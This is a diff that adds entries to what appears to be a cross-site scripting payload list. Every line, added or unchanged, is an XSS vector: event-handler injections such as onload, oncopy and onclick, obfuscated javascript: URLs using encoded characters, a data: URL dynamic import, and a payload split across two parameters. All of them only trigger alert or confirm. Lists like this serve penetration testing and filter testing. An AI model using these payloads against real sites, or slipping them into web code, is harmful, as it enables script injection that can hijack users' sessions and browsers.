@@ -4,6 +4,8 @@ test+onfouus='alert(0)'id='xss'
 Function`alert\`xss\````
 «input»;p=-alert(1)}//\$result*var n = {a: "-alert(1)}//\", b: "-alert(1)}//\"};
 "'`()[]\%; 
+<x/oncopy=alert()>x
+<svg id=javascript:alert(10) onload=location=id>
 "autofocus onfocus=alert(1)//
 </script><script>alert(1)</script>
 <link href=javascript:alert(1) accesskey=k> 
@@ -11,7 +13,15 @@ Function`alert\`xss\````
 -confirm`1`-”
 \”-confirm`1`//
 <x/oncopy=alert()>x
+?url="onm<>ouseover="ale<>rt(1)
+" accesskey='x' onclick='confirm`1`' //
+<svg onload="import('data:text/javascript,al'+''+'ert(0)')">
 <svg id=javascript:alert(10) onload=location=id>
+<a href="jav%0Dascript&colon;alert(1)">
+<a href=javascript&colon;confirm(1)>
+<a href=&#01javascript:alert(1)>
+param A=<script>alert("
+param B=")</script>
 <tag handler=code>
 \”}})})-confirm`1`//
 \”}})})-confirm`1`/*/
